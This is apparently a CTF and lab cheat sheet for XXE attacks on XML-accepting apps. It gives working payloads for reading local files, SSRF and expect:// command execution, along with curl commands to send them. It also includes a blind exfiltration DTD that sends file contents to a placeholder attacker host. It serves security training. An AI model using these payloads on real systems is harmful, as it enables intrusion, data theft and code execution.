# XXE — XML External Entities (CWE-611)

**Signs**: the app accepts XML (import, SOAP, RSS/Atom, SVG upload, DOCX/XLSX, SAML, `Content-Type:
application/xml`), Java/PHP/.NET backends with default parsers. Hint "the reader trusts all doors —
open the outside one".

## 1. Basic file read (entity reflected in output)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag/flag">]>
<record><id>1</id><title>&xxe;</title></record>
```
Put `&xxe;` in a field the app **echoes back** (title, name, error message).
```bash
curl -s -X POST $T/import -H 'Content-Type: application/xml' --data-binary @xxe.xml
curl -s -X POST $T/import --data-urlencode "xml@xxe.xml"          # if the form posts field 'xml'
python scripts/injection/xxe_send.py $T/import --file /flag/flag --field xml --tag title
```
Check how the real form sends it (raw body vs a form field) — copy that exactly.

## 2. Variants
| Need | Payload idea |
|---|---|
| Directory listing (Java) | `SYSTEM "file:///"` — Java returns a dir listing |
| File with `<`/`&` (breaks XML) | PHP: `php://filter/convert.base64-encode/resource=/etc/passwd`; Java: CDATA via external DTD |
| No reflection (blind) | parameter entities + external DTD on your server → OOB exfil |
| SSRF | `SYSTEM "http://127.0.0.1:8080/admin"` |
| RCE (PHP expect) | `SYSTEM "expect://id"` (deck: `expect://curl$IFS-O$IFS...`) |
| Error-based | load a non-existent file named after the content |

Blind OOB (host `evil.dtd` on your server):
```xml
<!-- evil.dtd -->
<!ENTITY % f SYSTEM "file:///flag/flag">
<!ENTITY % e "<!ENTITY &#x25; x SYSTEM 'http://YOUR_IP/?d=%f;'>">
%e; %x;
<!-- payload -->
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOUR_IP/evil.dtd"> %d;]><r/>
```

## 3. XML in disguise
SVG (`<svg>` with DOCTYPE) as avatar; DOCX/XLSX (zip → edit `word/document.xml`); SOAP bodies;
JSON endpoints that also accept `Content-Type: application/xml`.

Seen in: `inj4` (Catalogo: Java `DocumentBuilderFactory` defaults, entity in `<title>` reflected),
bWAPP/Mutillidae XXE labs.
